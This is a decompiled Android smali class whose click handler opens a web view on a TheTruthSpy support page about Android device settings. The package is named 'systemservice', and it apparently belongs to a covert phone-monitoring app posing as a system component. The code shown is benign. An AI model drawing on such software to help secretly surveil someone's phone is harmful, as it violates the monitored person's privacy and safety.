.class Lcom/systemservice/a;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/UIConfigActivity;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/UIConfigActivity;


# direct methods
.method constructor <init>(Lcom/systemservice/UIConfigActivity;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a;->a:Lcom/systemservice/UIConfigActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 1

    new-instance p1, Lcom/thefinestartist/finestwebview/a;

    iget-object v0, p0, Lcom/systemservice/a;->a:Lcom/systemservice/UIConfigActivity;

    invoke-direct {p1, v0}, Lcom/thefinestartist/finestwebview/a;-><init>(Landroid/app/Activity;)V

    const-string v0, "https://support.thetruthspy.com/hc/en-us/sections/360002994054-Essential-settings-for-Android-devices-target-version-"

    invoke-virtual {p1, v0}, Lcom/thefinestartist/finestwebview/a;->a(Ljava/lang/String;)V

    return-void
.end method
